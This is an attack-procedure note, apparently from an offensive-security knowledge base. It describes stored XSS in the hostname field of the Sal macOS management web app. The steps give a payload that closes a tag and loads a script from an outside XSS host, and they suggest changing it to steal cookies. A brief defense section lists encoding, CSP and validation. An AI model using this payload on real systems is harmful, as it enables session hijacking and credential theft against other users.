---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
  - macOS
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0ae8a5e7-d5fb-4d60-86a7-22d1b15743a6
created_at: '2025-12-13T23:55:20.826Z'
updated_at: '2025-12-13T23:55:20.826Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Sal-Machine-Hostname

## Summary

This procedure exploits the lack of input sanitization in the Sal web application's machine hostname field, allowing injection of a JavaScript payload that is stored in the database and later rendered unsafely.

## Description

In the Sal application (version 4.1.4.2149), machine hostnames are user-controlled inputs that are stored without proper escaping. An attacker with access to modify machine details can inject HTML/JavaScript, such as a script tag sourcing an external payload. This stored XSS is blind because the injector may not immediately see execution, but it activates when others view lists containing the machine. The target environment is a web-based macOS management tool, requiring authenticated access. Expected outcomes include payload persistence and setup for victim-side execution, potentially leading to session theft or data exfiltration.

## Requirements

1. Authenticated access to the Sal web dashboard
2. Permissions to edit machine details, including hostname
3. Knowledge of XSS payload construction (e.g., bypassing basic filters)

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity escaping) when rendering hostnames in links or text
- Use Content Security Policy (CSP) to restrict script sources
- Monitor for anomalous hostname changes via audit logs
- Validate inputs against expected hostname patterns (e.g., alphanumeric only)

## Objectives

1. Persist malicious JavaScript in the Sal database via hostname field
2. Set up conditions for execution in other users' browsers
3. Enable follow-on attacks like credential theft

## Instructions

### Step 1: Access Machine Management

**Context**: Log in to the Sal interface and locate the machine edit functionality to prepare for payload injection.

Navigate to the machine list in the Sal dashboard at https://sal.██████.com and select a target machine for editing.

### Step 2: Modify Hostname with Payload

**Context**: Inject the XSS payload into the hostname field, ensuring it closes any surrounding HTML tags to form a valid script element.

Update the hostname to: `example-host"><script src="https://nahamsec.xss.ht"></script>` (adjust to close tags like ">&lt;script... if needed based on rendering).

Save the machine details to store the payload.

> The payload uses an external script host for verification; replace with custom JS for specific attacks (e.g., stealing cookies via document.cookie).

### Step 3: Confirm Storage

**Context**: Verify the payload is saved without triggering errors, though execution may not be immediate.

Check the machine list for the updated hostname; no execution occurs here as it's the injector's session.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[injection]]
